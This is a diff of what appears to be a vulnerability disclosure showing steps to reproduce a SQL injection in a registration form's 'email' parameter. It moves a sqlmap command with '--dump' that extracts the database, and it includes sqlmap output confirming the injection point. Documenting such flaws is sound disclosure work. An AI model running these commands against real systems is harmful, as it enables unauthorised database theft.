@@ -51,10 +51,6 @@ Step to Reproduce:
 
 `sqlmap -r register_req.txt -p email`
 
-__dump database;__
-
-`sqlmap -r register_req.txt -p email --dump`
-
 ```
 POST parameter 'email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
 sqlmap identified the following injection point(s) with a total of 433 HTTP(s) requests:
@@ -70,3 +66,10 @@ Parameter: email (POST)
 ---
 
 ```
+
+
+__dump database;__
+
+`sqlmap -r register_req.txt -p email --dump`
+
+
